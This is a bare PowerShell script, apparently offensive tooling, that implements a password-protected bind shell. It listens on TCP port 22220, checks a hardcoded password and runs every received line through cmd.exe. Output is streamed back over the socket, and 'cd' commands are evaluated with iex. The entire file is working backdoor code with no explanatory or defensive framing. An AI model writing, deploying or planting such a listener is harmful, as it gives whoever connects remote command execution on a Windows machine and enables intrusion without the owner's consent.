add-type -assemblyname system.core
$bind_port = 22220
$password = 'fucku';

$listener = [System.Net.Sockets.TcpListener]$bind_port;
$listener.start();
$client = $listener.AcceptTcpClient();
$e = New-Object System.Text.ASCIIEncoding;
$stream = $client.GetStream();


[byte[]] $b = 0..65535|%{0}
[byte[]] $outbuf = 0..65535|%{0}
[byte[]] $errbuf = 0..65535|%{0}

$stream.WriteTimeout = 5000;
$stream.ReadTimeout = 10000;

$prompt = $e.GetBytes("Input pass: ");
$stream.Write($prompt, 0, $prompt.Length);
$stream.Flush();
$i = $stream.Read($b, 0, $b.Length);
if($e.GetString($b, 0, $i).Trim() -ne $password) {
    $client.Close();
    $listener.Stop();
    exit;
}

function Find-ChildProcess {
param($ID=$PID)

$CustomColumnID = @{
Name = 'Id'
Expression = { [Int[]]$_.ProcessID }
}

$result = Get-WmiObject -Class Win32_Process -Filter "ParentProcessID=$ID" |
Select-Object -Property ProcessName, $CustomColumnID, CommandLine

$result
$result | Where-Object { $_.ID -ne $null } | ForEach-Object {
Find-ChildProcess -id $_.Id
}
}

while($client.Connected) {
    $prompt = $e.GetBytes($pwd.Path + ">");

    try {
        $stream.ReadTimeout = 300000;
        $stream.Write($prompt, 0, $prompt.Length);
        $stream.Flush();
        if(($i = $stream.Read($b, 0, $b.Length)) -le 0) {
            break;
        }
    } catch {
        break;
    }


	$data = $e.GetString($b, 0, $i);

    if($data.StartsWith("cd ")) {
        iex $data;
        continue;
    }

    if($data.Trim() -eq "exit") {
        break;
    }

    $process = New-Object System.Diagnostics.Process
    $si = $process.StartInfo;
    $si.FileName = "c:\windows\system32\cmd.exe";
	$si.WorkingDirectory = $pwd.Path;
	$si.Arguments = "/c "+$data;
	$si.UseShellExecute = $false;
	$si.RedirectStandardInput = $true;
	$si.RedirectStandardOutput = $true;
    $si.RedirectStandardError = $true;
    $si.CreateNoWindow = $true;

    $process.Start() > $null

    $out = $process.StandardOutput.BaseStream;
    $err = $process.StandardError.BaseStream;
    $in = $process.StandardInput.BaseStream;

    $out_op = $out.BeginRead($outbuf, 0, $outbuf.Length, $null, $null);
    $err_op = $err.BeginRead($errbuf, 0, $errbuf.Length, $null, $null);

    $stream.ReadTimeout = 100;
    
	while(($process.HasExited -ne $true) -and $client.Connected) {
        if($out_op.IsCompleted) {
            if(($j = $out.EndRead($out_op)) -gt 0) {
                $stream.Write($outbuf, 0, $j);
                $stream.Flush();
             }
             $out_op = $out.BeginRead($outbuf, 0, $outbuf.Length, $null, $null);
         }
         if($err_op.IsCompleted) {
            if(($j = $err.EndRead($err_op)) -gt 0) {
                $stream.Write($errbuf, 0, $j);
                $stream.Flush();
             }
             $err_op = $err.BeginRead($errbuf, 0, $errbuf.Length, $null, $null);
         }
         try {
    		 while(($j = $stream.Read($b, 0, $b.Length)) -gt 0) {
    			 $in.Write($b, 0, $j);
                 $in.Flush();
	    	 }
         } catch {

         }
	}

    try {

        if($process.HasExited -eq $true) {
           if(($j = $out.EndRead($out_op)) -gt 0) {
               $stream.Write($outbuf, 0, $j);
               $stream.Flush();
            }
           if(($j = $err.EndRead($err_op)) -gt 0) {
               $stream.Write($errbuf, 0, $j);
               $stream.Flush();
             }
            while(($j = $out.Read($outbuf, 0, $outbuf.Length)) -gt 0) {
                $stream.Write($outbuf, 0, $j);
                $stream.Flush();
             }
            while(($j = $err.Read($errbuf, 0, $errbuf.Length)) -gt 0) {
                $stream.Write($errbuf, 0, $j);
                $stream.Flush();
             }
         }
    } catch {

    }

    $process.StandardOutput.Close();
    $process.StandardError.Close();
	$process.StandardInput.Close();
    if($process.HasExited -ne $true) {
        Find-ChildProcess -ID $process.Id | Stop-Process -Force
        $process.Kill();
    }
	$process.Close();
	$process.Dispose();
}

$listener.Stop();